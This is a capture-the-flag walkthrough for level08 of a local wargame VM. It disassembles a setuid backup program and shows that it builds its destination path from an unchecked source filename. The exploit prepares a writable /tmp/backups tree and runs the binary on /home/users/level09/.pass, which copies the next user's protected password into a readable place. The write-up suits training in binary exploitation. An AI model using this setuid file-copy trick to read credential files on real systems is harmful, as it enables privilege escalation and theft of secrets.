# level08

For now, retrieve the `level08` binary from the VM.

## Connect to level08

Read the password obtained from level07:

```sh
cat level07/flag
```

Connect to the VM:

```sh
ssh level08@127.0.0.1 -p 2222
```

When SSH asks for a password, paste the content of `level07/flag`.

## Get the binary

Copy the ELF binary from the VM:

```sh
scp -P 2222 level08@127.0.0.1:/home/users/level08/level08 ./level08/src/level08
```

Use the content of `level07/flag` as the password.

Verify the downloaded binary:

```sh
file level08/src/level08
```

The local binary should now be:

```text
level08/src/level08
```

## Save `main_dump_gdb`

Inside the level08 SSH session, load the binary using its absolute path:

```sh
gdb /home/users/level08/level08
```

Save the complete disassembly of `main`:

```gdb
set disassembly-flavor intel
set logging file /tmp/level08_main_dump_gdb
set logging overwrite on
set logging on
disas main
set logging off
quit
```

Verify that the dump exists on the VM:

```sh
ls -l /tmp/level08_main_dump_gdb
```

From the repository root on the host, copy it locally:

```sh
scp -P 2222 level08@127.0.0.1:/tmp/level08_main_dump_gdb ./level08/src/main_dump_gdb
```

Use the content of `level07/flag` as the password.

The local files should now be:

```text
level08/src/level08
level08/src/main_dump_gdb
```

## Decode addresses from `main_dump_gdb`

Compile the shared decoder from the repository root if necessary:

```sh
gcc -Wall -Wextra -Werror decode_address.c -o decode_address
```

The readable data addresses used by `main` are:

```text
0x400d57
0x400d6b
0x400d6d
0x400d7c
0x400d96
0x400da9
0x400dab
0x400db6
0x400dd2
```

Decode them against the local level08 binary:

```sh
./decode_address level08/src/level08 0x400d57
./decode_address level08/src/level08 0x400d6b
./decode_address level08/src/level08 0x400d6d
./decode_address level08/src/level08 0x400d7c
./decode_address level08/src/level08 0x400d96
./decode_address level08/src/level08 0x400da9
./decode_address level08/src/level08 0x400dab
./decode_address level08/src/level08 0x400db6
./decode_address level08/src/level08 0x400dd2
```

The output is:

```text
0x400d57 -> "Usage: %s filename\n"
0x400d6b -> "w"
0x400d6d -> "./backups/.log"
0x400d7c -> "ERROR: Failed to open %s\n"
0x400d96 -> "Starting back up: "
0x400da9 -> "r"
0x400dab -> "./backups/"
0x400db6 -> "ERROR: Failed to open %s%s\n"
0x400dd2 -> "Finished back up "
```

The address `0x4008c4` is executable code for `log_wrapper`, not a string address.

The decoded values show the program's behavior:

1. It opens `./backups/.log` for writing.
2. It opens the filename supplied in `argv[1]` for reading.
3. It builds a destination path by concatenating `"./backups/"` with the complete supplied filename.
4. It copies the source file into that destination one byte at a time.

The supplied filename is not restricted to the current directory. This path handling is the important behavior for the next step.

## Prepare a writable backup tree

The destination begins with the relative path `./backups/`. Running the program from the level08 home directory is not useful because that location is not freely writable.

Use `/tmp` as the working directory and reproduce the directory structure of the absolute source path:

```sh
mkdir -p /tmp/backups/home/users/level09
cd /tmp
```

For the source filename:

```text
/home/users/level09/.pass
```

the program constructs this destination:

```text
./backups//home/users/level09/.pass
```

The double slash is accepted as a normal path separator.

## Copy the protected password

Run the setuid level08 binary from `/tmp` and provide the level09 password file as its source:

```sh
/home/users/level08/level08 /home/users/level09/.pass
```

Use the exact source path above. Do not repeat the account directory as `/home/users/level09/level09/.pass`; that file does not exist.

The program opens the source with level09 privileges and copies it into the prepared writable tree. Read the copied file:

```sh
cat /tmp/backups/home/users/level09/.pass
```

This displays the password for level09.

## Save the flag

Back on the host, store the displayed password in:

```text
level08/flag
```

Verify it with:

```sh
cat level08/flag
```

## Connect to level09

Use the content of `level08/flag` as the SSH password:

```sh
ssh level09@127.0.0.1 -p 2222
```
